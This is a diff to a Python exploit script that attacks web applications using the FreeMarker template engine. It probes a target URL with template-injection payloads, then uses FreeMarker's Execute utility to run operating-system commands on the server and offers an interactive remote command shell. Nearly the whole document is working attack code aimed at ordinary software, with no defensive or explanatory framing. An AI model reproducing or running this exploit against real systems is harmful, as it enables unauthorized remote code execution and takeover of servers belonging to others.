@@ -1,6 +1,6 @@
 import argparse
 import requests
-import re
+import time
 from datetime import datetime
 
 
@@ -11,7 +11,7 @@ def response(stri):
         a[i + 1]
         for i, n in enumerate(a)
         if n == 'realbacon' and a[i + 1] != 'realbacon'
-    )
+    ).strip()
 
 
 def inject(payload):
@@ -38,40 +38,45 @@ try:
 except:
     print('[-]Invalid url')
     exit()
-
-fr = requests.post(args.url, '')
+data_fr = {args.data: "${{7*'7'}}"}
+data_sr = {args.data: "*realbacon*${.version}*realbacon*"}
+fr = requests.post(args.url, data_fr)
+sr = requests.post(args.url, data_sr)
 
 # Try to see if the website is running FREEMARKER
-if 'org.springframework.web.bind.MissingServletRequestParameterException' in fr.text:
-    print(f'[+]Url : {args.url} seems to run with FREEMARKER')
+if 'freemarker' in fr.text:
+    print(f'[+]Url : {args.url} seems to run with FREEMARKER {response(sr.text)}')
 else:
-    print(f'[-]Url : {args.url} does not seem to run with FREEMARKER')
+    print(f'[-]Url : {args.url} does not seem to run with FREEMARKER (maybe not injectable)')
     if input('Do you want to continue injection ? (y/n)') == 'n': exit()
 
+time.sleep(1)
 # Try to see if we can get back the data from command injection
 print(f'[+]Trying injection with post data : {args.data}')
 data_test = {
     args.data: '*realbacon*<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("echo $baconed$") }*realbacon*'}
 payload_test = requests.post(args.url, data=data_test)
 
-if response(payload_test.text).strip() == '$baconed$':
+time.sleep(0.5)
+if response(payload_test.text) == '$baconed$':
     print('[+]Injection successfull\n[+]Opening shell')
 else:
     # We dont get a response so we close the program
     print("[-]Target does not seem to be injectable...\n[-]Aborting...")
     exit()
 
+time.sleep(1)
 # retrive date
 now = datetime.now()
 time_display = now.strftime("%d/%m/%Y %H:%M:%S")
 
 # open the shell
 print(f'\n[+]Shell opened at {time_display}')
-print('[+]' + response(inject('id')).strip())
-print("[+]Current version of OS :", response(inject('hostnamectl')).strip())
-print("[+]Current path :", response(inject('pwd')).strip())
+print('[+]' + response(inject('id')))
+print("[+]Current version of OS :", response(inject('hostnamectl')))
+print("[+]Current path :", response(inject('pwd')))
 
 while True:
-    user_data = input(f'${response(inject("whoami")).strip()}- ')
-    if user_data == 'exit()': exit()
-    print(f'>>{response(inject(user_data)).strip()}')
+    user_data = input(f'{response(inject("whoami"))}${response(inject("pwd"))} - ')
+    if user_data == 'exit': exit()
+    print(response(inject(user_data)))
